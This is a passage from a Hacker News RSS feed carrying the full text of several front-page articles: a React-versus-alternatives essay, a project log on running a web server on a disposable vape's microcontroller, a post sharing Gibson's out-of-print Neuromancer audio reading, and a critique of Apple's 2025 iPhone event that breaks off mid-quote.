<?xml version='1.0' encoding='UTF-8'?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2025-09-16T16:11:51.133998+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=45252715</id><title>React is winning by default and slowing innovation</title><updated>2025-09-16T16:11:56.397004+00:00</updated><content>&lt;doc fingerprint="b7e9953b6b12f9da"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;React Won by Default – And It's Killing Frontend Innovation&lt;/head&gt;
    &lt;p&gt;React-by-default has hidden costs. Here's a case for making deliberate choices to select the right framework for the job.&lt;/p&gt;
    &lt;head rend="h1"&gt;React Won by Default – And It’s Killing Frontend Innovation&lt;/head&gt;
    &lt;p&gt;React is no longer winning by technical merit. Today it is winning by default. That default is now slowing innovation across the frontend ecosystem.&lt;/p&gt;
    &lt;p&gt;When teams need a new frontend, the conversation rarely starts with “What are the constraints and which tool best fits them?” It often starts with “Let’s use React; everyone knows React.” That reflex creates a self-perpetuating cycle where network effects, rather than technical fit, decide architecture.&lt;/p&gt;
    &lt;p&gt;Meanwhile, frameworks with real innovations struggle for adoption. Svelte compiles away framework overhead. Solid delivers fine-grained reactivity without virtual-DOM tax. Qwik achieves instant startup via resumability. These approaches can outperform React’s model in common scenarios, but they rarely get a fair evaluation because React is chosen by default.&lt;/p&gt;
    &lt;p&gt;React is excellent at many things. The problem isn’t React itself, it’s the React-by-default mindset.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Innovation Ceiling&lt;/head&gt;
    &lt;p&gt;React’s technical foundations explain some of today’s friction. The virtual DOM was a clever solution for 2013’s problems, but as Rich Harris outlined in “Virtual DOM is pure overhead”, it introduces work modern compilers can often avoid.&lt;/p&gt;
    &lt;p&gt;Hooks addressed class component pain but introduced new kinds of complexity: dependency arrays, stale closures, and misused effects. Even React’s own docs emphasize restraint: “You Might Not Need an Effect”. Server Components improve time-to-first-byte, but add architectural complexity and new failure modes.&lt;/p&gt;
    &lt;p&gt;The React Compiler is a smart solution that automates patterns like &lt;code&gt;useMemo&lt;/code&gt;/&lt;code&gt;useCallback&lt;/code&gt;. Its existence is also a signal: we’re optimizing around constraints baked into the model.&lt;/p&gt;
    &lt;p&gt;Contrast this with alternative approaches: Svelte 5’s Runes simplify reactivity at compile time; Solid’s fine-grained reactivity updates exactly what changed; Qwik’s resumability eliminates traditional hydration. These aren’t incremental tweaks to React’s model—they’re different models with different ceilings.&lt;/p&gt;
    &lt;p&gt;Innovation without adoption doesn’t change outcomes. Adoption can’t happen when the choice is made by reflex.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Technical Debt We’re All Carrying&lt;/head&gt;
    &lt;p&gt;Defaulting to React often ships a runtime and reconciliation cost we no longer question. Even when it’s fast enough, the ceiling is lower than compile-time or fine-grained models. Developer time is spent managing re-renders, effect dependencies, and hydration boundaries instead of shipping value. The broader lesson from performance research is consistent: JavaScript is expensive on the critical path (The Cost of JavaScript).&lt;/p&gt;
    &lt;p&gt;We’ve centered mental models around “React patterns” instead of web fundamentals, reducing portability of skills and making architectural inertia more likely.&lt;/p&gt;
    &lt;p&gt;The loss isn’t just performance, it’s opportunity cost when better-fit alternatives are never evaluated. For instance, benchmarks like the JS Framework Benchmark show alternatives like Solid achieving up to 2-3x faster updates in reactivity-heavy scenarios compared to React.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Frameworks Being Suffocated&lt;/head&gt;
    &lt;head rend="h3"&gt;Svelte: The Compiler Revolution&lt;/head&gt;
    &lt;p&gt;Svelte shifts work to compile time: no virtual DOM, minimal runtime. Components become targeted DOM operations. The mental model aligns with web fundamentals.&lt;/p&gt;
    &lt;p&gt;But “not enough jobs” keeps Svelte adoption artificially low despite its technical superiority for most use cases. Real-world examples, like The Guardian’s adoption of Svelte for their frontend, demonstrate measurable gains in performance and developer productivity, with reported reductions in bundle sizes and faster load times. For instance, as detailed in Wired’s article on Svelte, developer Shawn Wang (@swyx on X/Twitter) reduced his site’s size from 187KB in React to just 9KB in Svelte by leveraging its compile-time optimizations, which shift framework overhead away from runtime. This leads to faster, more efficient apps especially on slow connections.&lt;/p&gt;
    &lt;head rend="h3"&gt;Solid: The Reactive Primitive Approach&lt;/head&gt;
    &lt;p&gt;Solid delivers fine-grained reactivity with JSX familiarity. Updates flow through signals directly to affected DOM nodes, bypassing reconciliation bottlenecks. Strong performance characteristics, limited mindshare. As outlined in Solid’s comparison guide, this approach enables more efficient updates than React’s virtual DOM, with precise reactivity that minimizes unnecessary work and improves developer experience through simpler state management.&lt;/p&gt;
    &lt;p&gt;While prominent case studies are scarcer than for more established frameworks, this is largely due to Solid’s lower adoption. Yet anecdotal reports from early adopters suggest similar transformative gains in update efficiency and code simplicity, waiting to be scaled and shared as more teams experiment.&lt;/p&gt;
    &lt;head rend="h3"&gt;Qwik: The Resumability Innovation&lt;/head&gt;
    &lt;p&gt;Qwik uses resumability instead of hydration, enabling instant startup by loading only what the current interaction needs. Ideal for large sites, long sessions, or slow networks. According to Qwik’s Think Qwik guide, this is achieved through progressive loading and serializing both state and code. Apps can thus resume execution instantly without heavy client-side bootstrapping, resulting in superior scalability and reduced initial load times compared to traditional frameworks.&lt;/p&gt;
    &lt;p&gt;Success stories for Qwik may be less visible simply because fewer teams have broken from defaults to try it. But those who have report dramatic improvements in startup times and resource efficiency, indicating a wealth of untapped potential if adoption grows.&lt;/p&gt;
    &lt;p&gt;All three under-adopted not for lack of merit, but because the default choice blocks trying them out.&lt;/p&gt;
    &lt;p&gt;Furthermore, React’s API surface area is notably larger and more complex than its alternatives, encompassing concepts like hooks, context, reducers, and memoization patterns that require careful management to avoid pitfalls. This expansive API contributes to higher cognitive load for developers, often leading to bugs from misunderstood dependencies or over-engineering. For example, in Cloudflare’s September 12, 2025 outage, a useEffect hook with a problematic dependency array triggered repeated API calls, overwhelming their Tenant Service and causing widespread failures. In contrast, frameworks like Svelte, Solid, and Qwik feature smaller, more focused APIs that emphasize simplicity and web fundamentals, reducing the mental overhead and making them easier to master and maintain.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Network Effect Prison&lt;/head&gt;
    &lt;p&gt;React’s dominance creates self-reinforcing barriers. Job postings ask for “React developers” rather than “frontend engineers,” limiting skill diversity. Component libraries and team muscle memory create institutional inertia.&lt;/p&gt;
    &lt;p&gt;Risk-averse leaders choose the “safe” option. Schools teach what jobs ask for. The cycle continues independent of technical merit.&lt;/p&gt;
    &lt;p&gt;That’s not healthy competition; it’s ecosystem capture by default.&lt;/p&gt;
    &lt;head rend="h2"&gt;Breaking the Network Effect&lt;/head&gt;
    &lt;p&gt;Escaping requires deliberate action at multiple levels. Technical leaders should choose based on constraints and merits, not momentum. Companies can allocate a small innovation budget to trying alternatives. Developers can upskill beyond a single mental model.&lt;/p&gt;
    &lt;p&gt;Educators can teach framework-agnostic concepts alongside specific tools. Open source contributors can help alternative ecosystems mature.&lt;/p&gt;
    &lt;p&gt;Change won’t happen automatically. It requires conscious choice.&lt;/p&gt;
    &lt;head rend="h2"&gt;Framework Evaluation Checklist&lt;/head&gt;
    &lt;p&gt;To make deliberate choices, use this simple checklist when starting a new project:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Assess Performance Needs: Evaluate metrics like startup time, update efficiency, and bundle size. Prioritize frameworks with compile-time optimizations if speed is critical.&lt;/item&gt;
      &lt;item&gt;Team Skills and Learning Curve: Consider existing expertise but factor in migration paths; many alternatives offer gentle ramps (e.g., Solid’s JSX compatibility with React).&lt;/item&gt;
      &lt;item&gt;Scaling and Cost of Ownership: Calculate long-term costs, including maintenance, dependency management, and tech debt. Alternatives often reduce runtime overhead, lowering hosting costs and improving scalability.&lt;/item&gt;
      &lt;item&gt;Ecosystem Fit: Balance maturity with innovation; pilot in non-critical areas to test migration feasibility and ROI.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;The Standard Counter‑Arguments&lt;/head&gt;
    &lt;p&gt;“But ecosystem maturity!” Maturity is valuable, and can also entrench inertia. Age isn’t the same as fitness for today’s constraints.&lt;/p&gt;
    &lt;p&gt;Additionally, a mature ecosystem often means heavy reliance on third-party packages, which can introduce maintenance burdens like keeping dependencies up-to-date, dealing with security vulnerabilities, and bloating bundles with unused code. While essential in some cases, this flexibility can lead to over-dependence; custom solutions tailored to specific needs are often leaner and more maintainable in the long run. Smaller ecosystems in alternative frameworks encourage building from fundamentals, fostering deeper understanding and less technical debt. Moreover, with AI coding assistants now able to generate precise, custom functions on demand, the barrier to creating bespoke utilities has lowered dramatically. This makes it feasible to avoid generic libraries like lodash or date libraries like Moment or date-fns entirely in favor of lightweight, app-specific implementations.&lt;/p&gt;
    &lt;p&gt;“But hiring!” Hiring follows demand. You can de‑risk by piloting alternatives in non‑critical paths, then hiring for fundamentals plus on‑the‑job training.&lt;/p&gt;
    &lt;p&gt;“But component libraries!” Framework‑agnostic design systems and Web Components reduce lock-in while preserving velocity.&lt;/p&gt;
    &lt;p&gt;“But stability!” React’s evolution from classes to hooks to Server Components demonstrates constant churn, not stability. Alternative frameworks often provide more consistent APIs.&lt;/p&gt;
    &lt;p&gt;“But proven at scale!” jQuery was proven at scale too. Past success doesn’t guarantee future relevance.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Broader Ecosystem Harm&lt;/head&gt;
    &lt;p&gt;Monoculture slows web evolution when one framework’s constraints become de facto limits. Talent spends cycles solving framework-specific issues rather than pushing the platform forward. Investment follows incumbents regardless of technical merit.&lt;/p&gt;
    &lt;p&gt;Curricula optimize for immediate employability over fundamentals, creating framework-specific rather than transferable skills. Platform improvements get delayed because “React can handle it” becomes a default answer.&lt;/p&gt;
    &lt;p&gt;The entire ecosystem suffers when diversity disappears.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Garden We Could Grow&lt;/head&gt;
    &lt;p&gt;Healthy ecosystems require diversity, not monocultures. Innovation emerges when different approaches compete and cross-pollinate. Developers grow by learning multiple mental models. The platform improves when several frameworks push different boundaries.&lt;/p&gt;
    &lt;p&gt;Betting everything on one model creates a single point of failure. What happens if it hits hard limits? What opportunities are we missing by not exploring alternatives?&lt;/p&gt;
    &lt;p&gt;It’s time to choose frameworks based on constraints and merit rather than momentum. Your next project deserves better than React-by-default. The ecosystem deserves the innovation only diversity can provide.&lt;/p&gt;
    &lt;p&gt;Stop planting the same seed by default. The garden we could cultivate through diverse framework exploration would be more resilient and more innovative than the monoculture we’ve drifted into.&lt;/p&gt;
    &lt;p&gt;The choice is ours to make.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.lorenstew.art/blog/react-won-by-default/"/><published>2025-09-15T17:46:01+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45252817</id><title>Hosting a website on a disposable vape</title><updated>2025-09-16T16:11:56.340860+00:00</updated><content>&lt;doc fingerprint="26b5c1054b922ae9"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Hosting a WebSite on a Disposable Vape&lt;/head&gt;
    &lt;head rend="h1"&gt;Preface#&lt;/head&gt;
    &lt;p&gt;This article is NOT served from a web server running on a disposable vape. If you want to see the real deal, click here. The content is otherwise identical.&lt;/p&gt;
    &lt;head rend="h1"&gt;Background#&lt;/head&gt;
    &lt;p&gt;For a couple of years now, I have been collecting disposable vapes from friends and family. Initially, I only salvaged the batteries for “future” projects (It’s not hoarding, I promise), but recently, disposable vapes have gotten more advanced. I wouldn’t want to be the lawyer who one day will have to argue how a device with USB C and a rechargeable battery can be classified as “disposable”. Thankfully, I don’t plan on pursuing law anytime soon.&lt;/p&gt;
    &lt;p&gt;Last year, I was tearing apart some of these fancier pacifiers for adults when I noticed something that caught my eye, instead of the expected black blob of goo hiding some ASIC (Application Specific Integrated Circuit) I see a little integrated circuit inscribed “PUYA”. I don’t blame you if this name doesn’t excite you as much it does me, most people have never heard of them. They are most well known for their flash chips, but I first came across them after reading Jay Carlson’s blog post about the cheapest flash microcontroller you can buy. They are quite capable little ARM Cortex-M0+ micros.&lt;/p&gt;
    &lt;p&gt;Over the past year I have collected quite a few of these PY32 based vapes, all of them from different models of vape from the same manufacturer. It’s not my place to do free advertising for big tobacco, so I won’t mention the brand I got it from, but if anyone who worked on designing them reads this, thanks for labeling the debug pins!&lt;/p&gt;
    &lt;head rend="h1"&gt;What are we working with#&lt;/head&gt;
    &lt;p&gt;The chip is marked &lt;code&gt;PUYA C642F15&lt;/code&gt;, which wasn’t very helpful. I was pretty sure it was a &lt;code&gt;PY32F002A&lt;/code&gt;, but after poking around with pyOCD, I noticed that the flash was 24k and we have 3k of RAM. The extra flash meant that it was more likely a &lt;code&gt;PY32F002B&lt;/code&gt;, which is actually a very different chip.1&lt;/p&gt;
    &lt;p&gt;So here are the specs of a microcontroller so bad, it’s basically disposable:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;24MHz Coretex M0+&lt;/item&gt;
      &lt;item&gt;24KiB of Flash Storage&lt;/item&gt;
      &lt;item&gt;3KiB of Static RAM&lt;/item&gt;
      &lt;item&gt;a few peripherals, none of which we will use.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;You may look at those specs and think that it’s not much to work with. I don’t blame you, a 10y old phone can barely load google, and this is about 100x slower. I on the other hand see a blazingly fast web server.&lt;/p&gt;
    &lt;head rend="h1"&gt;Getting online#&lt;/head&gt;
    &lt;p&gt;The idea of hosting a web server on a vape didn’t come to me instantly. In fact, I have been playing around with them for a while, but after writing my post on semihosting, the penny dropped.&lt;/p&gt;
    &lt;p&gt;If you don’t feel like reading that article, semihosting is basically syscalls for embedded ARM microcontrollers. You throw some values/pointers into some registers and call a breakpoint instruction. An attached debugger interprets the values in the registers and performs certain actions. Most people just use this to get some logs printed from the microcontroller, but they are actually bi-directional.&lt;/p&gt;
    &lt;p&gt;If you are older than me, you might remember a time before Wi-Fi and Ethernet, the dark ages, when you had to use dial-up modems to get online. You might also know that the ghosts of those modems still linger all around us. Almost all USB serial devices actually emulate those modems: a 56k modem is just 57600 baud serial device. Data between some of these modems was transmitted using a protocol called SLIP (Serial Line Internet Protocol).2&lt;/p&gt;
    &lt;p&gt;This may not come as a surprise, but Linux (and with some tweaking even macOS) supports SLIP. The &lt;code&gt;slattach&lt;/code&gt; utility can make any &lt;code&gt;/dev/tty*&lt;/code&gt; send and receive IP packets. All we have to do is put the data down the wire in the right format and provide a virtual tty.
This is actually easier than you might imagine, pyOCD can forward all semihosting though a telnet port. Then, we use &lt;code&gt;socat&lt;/code&gt; to link that port to a virtual tty:&lt;/p&gt;
    &lt;code&gt;pyocd gdb -S -O semihost_console_type=telnet -T $(PORT) $(PYOCDFLAGS) &amp;amp;
socat PTY,link=$(TTY),raw,echo=0 TCP:localhost:$(PORT),nodelay &amp;amp;
sudo slattach -L -p slip -s 115200 $(TTY) &amp;amp;
sudo ip addr add 192.168.190.1 peer 192.168.190.2/24 dev sl0
sudo ip link set mtu 1500 up dev sl0
&lt;/code&gt;
    &lt;p&gt;Ok, so we have a “modem”, but that’s hardly a web server. To actually talk TCP/IP, we need an IP stack. There are many choices, but I went with uIP because it’s pretty small, doesn’t require an RTOS, and it’s easy to port to other platforms. It also, helpfully, comes with a very minimal HTTP server example.&lt;/p&gt;
    &lt;p&gt;After porting the SLIP code to use semihosting, I had a working web server&amp;amp;mldr;half of the time. As with most highly optimised libraries, uIP was designed for 8 and 16-bit machines, which rarely have memory alignment requirements. On ARM however, if you dereference a &lt;code&gt;u16 *&lt;/code&gt;, you better hope that address is even, or you’ll get an exception. The &lt;code&gt;uip_chksum&lt;/code&gt; assumed &lt;code&gt;u16&lt;/code&gt; alignment, but the script that creates the filesystem didn’t.
I actually decided to modify a bit the structure of the filesystem to make it a bit more portable.
This was my first time working with &lt;code&gt;perl&lt;/code&gt; and I have to say, it’s quite well suited to this kind of task.&lt;/p&gt;
    &lt;head rend="h1"&gt;Blazingly fast#&lt;/head&gt;
    &lt;p&gt;So how fast is a web server running on a disposable microcontroller. Well, initially, not very fast. Pings took ~1.5s with 50% packet loss and a simple page took over 20s to load. That’s so bad, it’s actually funny, and I kind of wanted to leave it there.&lt;/p&gt;
    &lt;p&gt;However, the problem was actually between the seat and the steering wheel the whole time. The first implementation read and wrote a single character at a time, which had a massive overhead associated with it. I previously benchmarked semihosting on this device, and I was getting ~20KiB/s, but uIP’s SLIP implementation was designed for very low memory devices, so it was serialising the data byte by byte. We have a whopping 3kiB of RAM to play with, so I added a ring buffer to cache reads from the host and feed them into the SLIP poll function. I also split writes in batches to allow for escaping.&lt;/p&gt;
    &lt;p&gt;Now this is what I call blazingly fast! Pings now take 20ms, no packet loss and a full page loads in about 160ms. This was using using almost all of the RAM, but I could also dial down the sizes of the buffer to have more than enough headroom to run other tasks. The project repo has everything set to a nice balance latency and RAM usage:&lt;/p&gt;
    &lt;code&gt;Memory region         Used Size  Region Size  %age Used
           FLASH:        5116 B        24 KB     20.82%
             RAM:        1380 B         3 KB     44.92%
&lt;/code&gt;
    &lt;p&gt;For this blog however, I paid for none of the RAM, so I’ll use all of the RAM.&lt;/p&gt;
    &lt;p&gt;As you may have noticed, we have just under 20kiB (80%) of storage space. That may not be enough to ship all of React, but as you can see, it’s more than enough to host this entire blog post. And this is not just a static page server, you can run any server-side code you want, if you know C that is.&lt;/p&gt;
    &lt;p&gt;Just for fun, I added a json api endpoint to get the number of requests to the main page (since the last crash) and the unique ID of the microcontroller.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://bogdanthegeek.github.io/blog/projects/vapeserver/"/><published>2025-09-15T17:53:19+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45255137</id><title>William Gibson Reads Neuromancer (2004)</title><updated>2025-09-16T16:11:56.284674+00:00</updated><content>&lt;doc fingerprint="7a59d0cbefbe40c0"&gt;
  &lt;main&gt;
    &lt;p&gt;The author Ray Bradbury is one of the early science fiction authors that moved science fiction into a literary form. As a writer Bradbury constructs beautifully written stories and novels. Bradbury's writing is in stark contrast to Bradbury as a speaker. The first time I heard Ray Bradbury speak was at the Association for Computing Machinery (ACM) yearly conference in Los Angeles in the 1980s. Hearing Bradbury speak is an almost painful experience. The pictures that Bradbury can paint with the written word seem to be entirely missing when Bradbury speaks. He is halting, awkward and does not seem to know where he wants to go in his talk.&lt;/p&gt;
    &lt;p&gt;In contrast to Bradbury, listenting to William Gibson has the feel of his written work. The same complex world view and sentence structure is there, although not as finely edited. An example of this can be found in the documentary made about William Gibson, No Maps for these Territories. This documentary includes extensive interviews with William Gibson. No Maps also provides a glimpse of the way Gibson looks at the interconnections and relationships in the world around us. This view of Gibson's mind shows us his genius.&lt;/p&gt;
    &lt;p&gt;The mirror between William Gibson's spoken voice and his written voice gives special force to his readings of his work. Early in his career Gibson did an abridged reading of Neuromancer, his first novel and the work that made him famous. It was in this novel that Gibson coined the term cyberspace. This reading was only published on audio-tape and is now out of print.&lt;/p&gt;
    &lt;p&gt;I hate the idea that Gibson's wonderful reading of Neuromancer should be lost or inaccessable. I was only able to hear it because the Mountain View (California) Library had a copy. Fortunately I've been able to find an MP3 copy of these audio tapes. They can be downloaded below.&lt;/p&gt;
    &lt;p&gt;I am only providing these MP3s because the original has been out of print for years. As a software engineer I believe that I should be paid for my work. If I hold this view then it is only reasonable that I should also believe that artist should be paid for their work. All of the software and music I own I have paid for (or is open source). I would prefer that the publisher re-issue the audio-tape of William Gibson's reading in a more modern format (perhaps CD) and that William Gibson collect royalties on this work. Gibson's reading has been out of print so long that I can only assume that this is unlikely to happen.&lt;/p&gt;
    &lt;p&gt;If you're a fan of William Gibson I hope that others will mirror these files as well so that they will never be lost.&lt;/p&gt;
    &lt;p&gt;This reading was published on four magnetic tape audio cassetts. These have been re-recorded in MP3 format:&lt;/p&gt;
    &lt;table&gt;
      &lt;row&gt;
        &lt;cell role="head"&gt;Neuromancer (abridged) read by William Gibson&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 1, side 1&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 1, side 2&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 2, side 1&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 2, side 2&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 3, side 1&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 3, side 2&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 4, side 1&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Tape 4, side 2&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;An on-line copy of William Gibson's Neuromancer&lt;/p&gt;
    &lt;p&gt;Neuromancer is one of the few books that I've read many times. All of Gibson's books are good (well, except for The Difference Engine, but that's Bruce Sterling's fault). Neuromancer is still in print, so you should go out an buy a copy if you want to read it. Writers pay their bills from the royalties from book sales. I've included the link above in case you want to get a feel for the book before you buy it (even paperback books are not cheap these days).&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="http://bearcave.com/bookrev/neuromancer/neuromancer_audio.html"/><published>2025-09-15T21:28:01+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45256577</id><title>I feel Apple has lost its alignment with me and other long-time customers</title><updated>2025-09-16T16:11:55.854563+00:00</updated><content>&lt;doc fingerprint="a40c890f536739d9"&gt;
  &lt;main&gt;
    &lt;p&gt;A first version of this piece was almost ready to be published two days ago, but after writing more than 2,000 words, I grew increasingly angry and exasperated, and that made the article become too meandering and rant-like, so I deleted everything, and started afresh several hours later.&lt;/p&gt;
    &lt;p&gt;This, of course, is about Awe-dropping, Apple’s September 9 event, where they presented the new iPhone lineup, the new AirPods Pro, and the new Apple Watches. And the honest truth here is that I’m becoming less and less inclined to talk about Apple, because it’s a company that I feel has lost its alignment with me and other long-time Apple users and customers.&lt;/p&gt;
    &lt;p&gt;The more Apple talks and moves like other big tech companies, the less special it gets; the less special and distinctive it gets, the less I’m interested in finding ways to talk about it. Yes, I have admitted that Apple makes me mad lately, so they still elicit a response that isn’t utter indifference on my part. And yes, you could argue that if Apple makes me mad, it means that in the end I still care.&lt;/p&gt;
    &lt;p&gt;But things aren’t this clear-cut. I currently don’t really care about Apple — I care that their bad software design decisions and their constant user-interface dumbing down may become trends and get picked up by other tech companies. So, what I still care about that’s related to Apple is essentially the consequences of their actions.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Steve Jobs quote&lt;/head&gt;
    &lt;p&gt;The event kicked off with the famous Steve Jobs quote,&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Design is not just what it looks like and feels like. Design is how it works.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;and I immediately felt the whiplash.&lt;/p&gt;
    &lt;p&gt;Why that quote? Why now, after months of criticism towards the new design æsthetic of Liquid Glass? I gave this choice three possible interpretations — I still may be missing something here; I’m sure my readers will let me know.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;It’s Apple’s way of trolling the critics, who have repeatedly resorted to Steve Jobs’s words to criticise the several misguided UI choices in Liquid Glass. It’s the same kind of response as Phil Schiller famously blurting, Can’t innovate anymore, my ass! in 2013 during the presentation of the then-redesigned Mac Pro. But it feels like a less genuine, more passive-aggressive response (if this is the way we’re supposed to read their use of that quote).&lt;/item&gt;
      &lt;item&gt;Apple used the quote in earnest. As in, they really believe that what they’re doing is in line with Jobs’s words. If that’s the case, this is utter self-deception. The quote doesn’t reflect at all what Apple is doing in the UI and software department — the Liquid Glass design is more ‘look &amp;amp; feel’ than ‘work’. And the very introduction of the iPhone Air proves that Jobs’s words are falling on deaf ears on the hardware front as well.&lt;/item&gt;
      &lt;item&gt;Apple used the quote ‘for effect’. As if Meta started a keynote by saying, Our mission is to connect people, no more no less. You know, something that makes you sound great and noble, but not necessarily something you truly believe (or something that is actually true, for that matter).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I can’t know for sure which of these might be the correct interpretation. I think it heavily depends on whose Apple executive came up with the idea. Whatever the case may be, the effect was the same — it felt really jarring and tone-deaf.&lt;/p&gt;
    &lt;head rend="h2"&gt;AirPods and Watches&lt;/head&gt;
    &lt;p&gt;If you’re not new here, you’ll know that these are the Apple products I care the least, together with HomePods and Apple TV. I always tune out when Apple presents these, so browse Apple’s website or go read the technical breakdown elsewhere. Personally, I’m too into traditional horology and therefore the design of the Apple Watch has always felt unimaginative at best, and plain ugly at worst.&lt;/p&gt;
    &lt;p&gt;From a UI standpoint, the Apple Watch continues to feel too complicated to use, and too overburdened with features. I wouldn’t say it’s design by committee, but more like designed to appeal to a whole committee. Apple wants the watch to appeal to a wide range of customers, therefore this little device comes stuffed with all kinds of bells and whistles. As I said more than once, the real feature I would love to see implemented is the ability to just turn off entire feature sets, so that if you only want to use it as a step counter and heart rate monitor, you can tell the watch to be just that; this would be more than just having a watchface that shows you time, steps, heart rate — it would be like having a watch that does only that. With all the features you deem unnecessary effectively disabled, imagine how simpler interacting with it would be, and imagine how longer its battery life would be.&lt;/p&gt;
    &lt;p&gt;What really got on my nerves during the Apple Watch segment of the event, though, is this: Apple always, always inserts a montage of sob stories about how the Apple Watch has saved lives, and what an indispensable life-saving device it is. Don’t get me wrong, I’m glad those lives were saved. But this kind of ‘showcase’ every year is made in such poor taste. It’s clear to me that it’s all marketing above everything else, that they just want to sell the product, and these people’s stories end up being used as a marketing tactic. It’s depressing.&lt;/p&gt;
    &lt;p&gt;As for the AirPods, and true wireless earbuds in general, I find this product category to be the most wasteful. Unless someone comes up with a type of earbuds that have easily replaceable batteries, I’m not interested in buying something that’s bound to become e‑waste in a relatively short period of time.&lt;/p&gt;
    &lt;head rend="h2"&gt;The new iPhones&lt;/head&gt;
    &lt;p&gt;Don’t buy them. Don’t waste your money, unless you have money to waste and don’t care about a company with this kind of leadership. Read How Tim Cook sold out Steve Jobs by Anil Dash to understand how I feel. I couldn’t have said it better myself.&lt;/p&gt;
    &lt;p&gt;I’d wrap up my article here, but then I’d receive a lot of emails asking me why I didn’t talk about the iPhones, so here are a few stray observations:&lt;/p&gt;
    &lt;p&gt;One, maybe involuntary, user-friendly move Apple did with this new iPhone lineup is that now we have three very distinct iPhone models, whose nature and price should really help people decide which to purchase.&lt;/p&gt;
    &lt;p&gt;The regular iPhone 17 is the safe, iterative solution. It looks like an iPhone 16, it works like an iPhone 16 that has now better features. It’s the ideal phone for the average user (tech-savvy or not). It’s the safe choice and the best value iPhone overall.&lt;/p&gt;
    &lt;p&gt;The iPhone 17 Pro is possibly the most Pro iPhone to date. During its presentation, I felt like Apple wants you to consider this more like a pro camera for videographers and filmmakers rather than just a smartphone with a good camera array. People who have no use for all these pro video recording features shouldn’t waste their money on it. Unless they want a big chunky iPhone with the best camera array and/or have money to burn. In my country (Spain), the 6.3‑inch iPhone 17 Pro starts at €1,319 with 256GB of storage, and goes up to €1,819 with 1TB of storage. For the bigger iPhone 17 Pro, those prices become €1,469 and €1,969 respectively, and if you want the iPhone 17 Pro Max with 2TB of storage, it’ll cost you €2,469. You do you, but I think these are insane prices for phones (and SSDs).&lt;/p&gt;
    &lt;p&gt;The iPhone Air is just… odd. I was curious to know about other techies’ reactions, and of all the major tech YouTubers, I think the one I’m agreeing the most on their first impressions of the iPhone Air is Marques Brownlee. At this point in his video, he says:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;I really think this phone is gonna be a hard sell, because if you subtract emotions from it, it’s just… the worst one. This is gonna jump in the lineup at $999 — it replaces essentially the Plus phones in the lineup — and it is surrounded by other iPhones that are better than it in basically every way, other than being super thin and light. So it’s a fascinating gamble.&lt;/p&gt;
      &lt;p&gt;This phone has the same A19 Pro chip in it as the Pro phones, minus one GPU core. Interesting choice: apparently it’s a bit more efficient than the base A19, so that’s good for battery life. But we also just heard a whole long list of choices Apple made with the Pro phones to make them more thermally efficient to not overheat — switching from titanium to aluminium, and adding a vapour chamber to the back. But this phone is still titanium, and absolutely does not have room for an advanced thermal solution or any sort of vapour chamber, so it sounds like this phone could get much hotter and throttle performance much quicker. It’s a red flag.&lt;/p&gt;
      &lt;p&gt;Now we also know that ultra-thin phones have a tendency to be a little bit less durable. They’ve bent over the years. And I’m not gonna be the first one to point this out. […] And Apple of course has thought about this. They’ve for sure tested this, and they’re telling us it’s the most durable iPhone ever. But, I mean, I’m looking at the phone and I think it qualifies also as a red flag. And then we already know there is just no way battery life can be good on this phone, right? There’s just no way. I’ve been reviewing phones for more than a decade, and all signs point to it being trash.&lt;/p&gt;
      &lt;p&gt;There was a slide in the keynote today about how they were still proud to achieve ‘all-day battery life’. But, like, come on. Really? I mean they still do the thing where they rearranged the components up into the little plateau at the top to make room for more battery at the bottom. But there’s just absolutely not enough room in this phone for a large battery. And it doesn’t appear to be silicon-carbon, or any sort of a special ultra-high density battery.&lt;/p&gt;
